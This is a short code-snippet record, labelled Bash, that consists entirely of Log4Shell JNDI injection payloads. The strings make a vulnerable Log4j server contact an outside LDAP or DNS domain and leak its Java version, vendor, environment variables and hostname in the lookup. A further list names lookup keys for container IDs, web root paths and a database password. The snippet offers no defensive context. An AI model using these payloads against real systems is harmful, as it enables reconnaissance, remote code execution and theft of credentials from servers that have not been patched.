---
id: cb09592b-36d2-40e3-8f14-3b99f3eddcc2
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:56.850104+00:00'
updated_at: '2023-04-06T03:55:56.865713+00:00'
---

# Code Snippet cb09592b

**Language**: Bash

```bash
# Identify Java version and hostname
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# More enumerations keywords and variables
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```
